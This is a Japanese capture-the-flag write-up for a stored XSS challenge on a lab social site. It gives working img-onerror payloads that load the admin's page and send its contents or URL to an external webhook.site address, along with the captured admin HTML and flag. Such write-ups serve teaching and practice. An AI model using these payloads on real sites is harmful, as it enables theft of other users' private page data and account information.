# XSSNS Pt.3

## / Overview

Stored XSS + クエリストリング送信

## / Writeup

[XSSNS Pt.2](../XSSNS%20Pt.2/)の続きです。前回の Stored XSS のアイデアで、今度はadminのマイページ情報を `webhook.site` に送ります。

### 失敗1

adminのマイページにアクセスさせるに`/xss/usr/`を読み込ませます。この情報をテキスト形式で webhook のURLに結合して送ります。

この結合に使えるのが**クエリストリング**です。URLの最後に `<webhookのURL>?data=<マイページの情報>`とすることでログからマイページの情報が見れます。

具体的には以下のscriptタグを投稿します。

```html
<img src="x" onerror="fetch('/xss/user/').then(r=>r.text()).then(t=>new Image().src = 'https://webhook.site/xxx?data=' + t"/>
```

流れとしては
* 画像`x`を読み込むがないので`onerror`へ
* fetch('/xss/user/') でページを読み込む
* then(r=>r.text()) それをテキストデータにして
* 新しい画像 ( https://webhook.site/xxx?data=<ページのデータ> )を読み込む

しかし、実際に実行すると容量が大きすぎてアクセス拒否になりました。

## 成功1

発想は同じで最後の部分を`クエリストリング`→`POSTリクエスト`に変えました。

```html
<img src=x onerror="fetch('/xss/user/').then(r=>r.text()).then(t=>fetch('https://webhook.site/xxx',{method:'POST',body:t}))">
```

webhookのログを確認すると次のようなページが送られています。

```html
<!DOCTYPE html>
<html>

<head>
    <title>Posts</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-50 min-h-screen">
    <div class="max-w-6xl mx-auto px-4 py-8">
        <div class="flex justify-between items-center mb-8">
            <h1 class="text-2xl font-bold text-gray-800">Welcome, katagaitai-CTF{the_adm1n_is_w4tch1n9_you}</h1>
            <div class="flex gap-x-2">
                <a href="/xss/user"
                    class="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 transition-colors">
                    My Page
                </a>
                <a href="/xss/report"
                    class="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 transition-colors">
                    Report Admin
                </a>
                <form action="/xss/logout" method="POST">
                    <button type="submit"
                        class="bg-red-500 text-white py-2 px-4 rounded-md hover:bg-red-600 transition-colors">
                        Logout
                    </button>
                </form>
            </div>
        </div>
        <div class="grid grid-cols-12 gap-8">
            <div class="col-span-3">
                <div class="bg-white p-6 rounded-lg shadow-sm">
                    <h3 class="font-bold text-lg text-gray-800 mb-4">Users visited you</h3>
                    <ul class="space-y-2">
                        
                            <li class="text-gray-700 hover:text-gray-900">
                                katagaitai-CTF{the_adm1n_is_w4tch1n9_you}
                            </li>
                            
                            <li class="text-gray-700 hover:text-gray-900">
                                2
                            </li>
                            
                            <li class="text-gray-700 hover:text-gray-900">
                                haruki
                            </li>
                            
                            <li class="text-gray-700 hover:text-gray-900">
                                kali
                            </li>
                            
                            <li class="text-gray-700 hover:text-gray-900">
                                hoge2
                            </li>
                            
                    </ul>
                </div>
            </div>

            <div class="col-span-9">
                
                <div class="bg-white p-6 rounded-lg shadow-sm mb-6">
                    <form action="/xss/post" method="POST" class="space-y-4">
                        <div>
                            <input type="text" name="title" placeholder="Post title" required="required"
                                class="w-full px-4 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                        <textarea name="content" placeholder="Write your post content..." required="required"
                            class="w-full px-4 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 h-32"></textarea>
                        <button type="submit"
                            class="bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 transition-colors">
                            Post
                        </button>
                    </form>
                </div>
                

                <div class="space-y-4">
                    <h3 class="font-bold text-lg text-gray-800 mb-4">Post of katagaitai-CTF{the_adm1n_is_w4tch1n9_you}</h3>
                    
                        <div class="bg-white p-6 rounded-lg shadow-sm">
                            <div class="flex items-center justify-between mb-4">
                                <div class="flex items-center">
                                    <span class="font-medium text-gray-800">katagaitai-CTF{the_adm1n_is_w4tch1n9_you}</span>
                                    <span class="text-gray-400 text-sm ml-4">1/31/2026, 2:34:35 AM</span>
                                </div>
                            </div>
                            <h2 class="text-xl font-medium text-gray-800 mb-2">
                                <a href="/xss/post/LAUozVhRfcJNCdEl"
                                    class="hover:text-blue-600 transition-colors">
                                    leak
                                </a>
                            </h2>
                        </div>
                        
                        <div class="bg-white p-6 rounded-lg shadow-sm">
                            <div class="flex items-center justify-between mb-4">
                                <div class="flex items-center">
                                    <span class="font-medium text-gray-800">katagaitai-CTF{the_adm1n_is_w4tch1n9_you}</span>
                                    <span class="text-gray-400 text-sm ml-4">1/30/2026, 4:51:19 PM</span>
                                </div>
                            </div>
                            <h2 class="text-xl font-medium text-gray-800 mb-2">
                                <a href="/xss/post/2VJGPN0jH1FewHMd"
                                    class="hover:text-blue-600 transition-colors">
                                    The third flag
                                </a>
                            </h2>
                        </div>
                        
                </div>
            </div>
        </div>
    </div>
</body>

</html>
```

`leak` と `The third flag` という投稿があり、後者にアクセスするとフラグが取れます。

## 成功2

```html
<img src=x onerror="fetch('/xss/user/').then(r=>fetch('https://webhook.site/d917358d-dc6e-408f-be94-ce60142b660c',{method:'POST',body:r.url}))">
```

とすることでadminのURL `/xss/user/Jt9fg8Fe4Kow` が得られます。アクセスして直接確認します。